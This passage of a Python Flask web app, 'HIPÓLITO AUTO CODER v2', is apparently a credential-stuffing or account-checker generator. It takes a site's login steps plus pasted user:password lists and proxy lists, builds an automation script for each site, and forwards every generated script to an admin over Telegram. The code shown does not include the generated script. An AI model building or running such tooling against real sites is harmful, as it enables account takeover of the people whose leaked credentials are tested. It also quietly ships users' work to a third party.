            session['expira'] = '∞'
            session.permanent = True
            return redirect('/app')
        else:
            error = '❌ KEY INVALIDA!'
            time.sleep(0.5)
    return render_template_string(LOGIN_PAGE, error=error)

@app.route('/app')
def main_app():
    if 'key' not in session:
        return redirect('/')
    return render_template_string(MAIN_PAGE, user=session.get('user',''), expira=session.get('expira',''))

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/api/execute', methods=['POST'])
@rate_limit(max_req=5, window=60)
def api_execute():
    if 'key' not in session:
        return jsonify({'success': False, 'message': 'Não autenticado!'})
    d = request.json or {}
    cfg = d.get('config', '')
    site_name = d.get('site_name', 'site')
    logins_txt = d.get('logins', '')
    proxies_txt = d.get('proxies', '')
    mode = d.get('mode', 'download')

    if not cfg.strip():
        return jsonify({'success': False, 'message': 'Cole a configuração do site!'})
    if not logins_txt.strip():
        return jsonify({'success': False, 'message': 'Cole pelo menos 1 login!'})

    steps, url = Parser.parse(cfg)
    useful = [s for s in steps if s['t'] in ['url', 'input', 'click']]
    if not useful:
        return jsonify({'success': False, 'message': 'Nada detectado na configuração!'})

    # Limpa nome de arquivo
    safe_site = re.sub(r'[^a-zA-Z0-9_-]', '_', site_name)[:40] or 'site'
    filename = safe_site + '.py'

    # Gera script
    script = Gen.generate(useful, filename, url, safe_site)

    # Salva
    with open(f'scripts_gerados/{filename}', 'w', encoding='utf-8') as f:
        f.write(script)

    # Conta logins e proxies
    logins_list = [l.strip() for l in logins_txt.split('\n') if l.strip() and ':' in l]
    proxies_list = [l.strip() for l in proxies_txt.split('\n') if l.strip()]

    # Salva API no storage
    apis = load_apis()
    record = {
        'id': str(uuid.uuid4())[:8],
        'site': safe_site,
        'filename': filename,
        'data': datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        'user': session.get('user', '?'),
        'logins_count': len(logins_list),
        'proxies_count': len(proxies_list),
        'script': script,
        'url': url,
    }
    apis.append(record)
    save_apis(apis)

    # Envia pro admin via Telegram
    tg_sent = False
    try:
        caption = (
            f"🚀 <b>NOVA API CRIADA</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Site: <code>{safe_site}</code>\n"
            f"🔗 URL: <code>{url or 'N/A'}</code>\n"
            f"👤 User: <code>{session.get('user','?')}</code>\n"
            f"📅 Data: {record['data']}\n"
            f"👥 Logins: {len(logins_list)}\n"
            f"🌍 Proxies: {len(proxies_list)}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>HIPÓLITO AUTO CODER</b>"
        )
        tg_send_doc(script.encode('utf-8'), filename, caption)
        tg_sent = True
    except Exception as e:
        print(f"[TG SEND ERR] {e}")

    msg = f"Script gerado com {len(useful)} passos!"
    if tg_sent:
        msg += " 📤 Enviado pro admin via Telegram."
    else:
        msg += " (Telegram offline, script disponível para download)"

    return jsonify({
        'success': True,
        'message': msg,
        'script': script,
        'filename': filename,
        'steps_count': len(useful),
        'parsed_steps': [{'d': s.get('d', s['t'])} for s in useful],
        'logins_count': len(logins_list),
        'proxies_count': len(proxies_list),
        'tg_sent': tg_sent,
    })

@app.route('/api/my_apis', methods=['GET'])
def my_apis():
    if 'key' not in session:
        return jsonify({'success': False, 'message': 'Não autenticado!'})
    apis = load_apis()
    return jsonify({'success': True, 'count': len(apis), 'apis': [
        {k: v for k, v in a.items() if k != 'script'} for a in apis
    ]})

@app.route('/ping')
def ping():
    return jsonify({'status': 'online', 'service': 'HIPOLITO', 'apis': len(load_apis())})

# ========== MAIN ==========
if __name__ == '__main__':
    threading.Thread(target=tg_polling, daemon=True).start()
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}HIPÓLITO AUTO CODER v2{Style.RESET_ALL}")
    print(f"{Fore.WHITE}http://localhost:{PORT}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Bot Telegram: @HIPOLITO (comandos /api /apis){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
